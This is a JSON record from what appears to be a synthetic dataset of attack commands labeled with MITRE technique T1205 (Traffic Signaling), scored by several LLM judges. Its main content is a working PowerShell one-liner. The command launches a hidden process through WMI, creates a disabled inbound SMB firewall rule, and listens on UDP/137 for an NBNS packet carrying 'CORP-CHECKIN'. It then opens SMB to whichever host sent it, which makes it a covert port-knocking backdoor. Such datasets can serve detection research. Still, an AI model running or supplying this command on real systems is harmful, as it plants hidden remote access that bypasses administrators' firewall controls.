{
  "technique_id": "T1205",
  "platform": "Windows",
  "shell": "PowerShell",
  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 445 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(137); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); if($d.Length -gt 50){ $s=[Text.Encoding]::ASCII.GetString($d); if($s -like ''*CORP-CHECKIN*''){ Set-NetFirewallRule -DisplayName ''Signal-Open-SMB-NBNS'' -Enabled True -RemoteAddress $ep.Address; break } } } }'",
  "explanation": "Observes NetBIOS Name Service traffic on UDP/137 and checks for a uniquely encoded name containing 'CORP-CHECKIN' (application-specific NBNS name). When seen, it enables an SMB firewall rule for the signaling host.",
  "rationale_steps": [
    "Create disabled inbound rule for TCP/445.",
    "Bind to UDP/137 and scan NBNS payload for a sentinel name.",
    "Enable the SMB rule restricted to the source IP upon match."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1205-5411a282-81a5cd9c",
  "source_prompt_hash": "5411a282",
  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The command is well-formed with balanced quotes/braces, valid PowerShell/WMI parameters, and correct escaping of embedded quotes.",
        "semantic_score": 3,
        "semantic_justification": "It aligns with T1205 by listening for a network signal and toggling a firewall rule, but in practice it requires admin rights, may fail to bind to UDP/137 on Windows, and naively searches ASCII in a binary NBNS payload.",
        "combined_score": 4.0,
        "confidence": 0.7,
        "timestamp": "2025-10-01T19:20:22.061245Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, parentheses, and braces, correct PowerShell syntax for WMI method invocation, and proper escape sequences for nested quotes.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by creating a UDP listener for NBNS traffic (port 137), monitoring for a specific signal ('CORP-CHECKIN'), and then enabling a previously disabled firewall rule only for the specific IP that sent the signal.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T03:38:51.003038Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, and correct PowerShell syntax and escaping for nested strings within the WMI argument.",
        "semantic_score": 3,
        "semantic_justification": "While the command accurately implements the traffic signaling mechanism (UDP listener, signal parsing) as per T1205, its core action of modifying firewall rules fundamentally requires administrative privileges, which contradicts the stated 'Privilege: None,' rendering the intended outcome operationally unfeasible.",
        "combined_score": 4.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T03:47:07.795951Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.667,
    "llm_average_score": 4.333,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}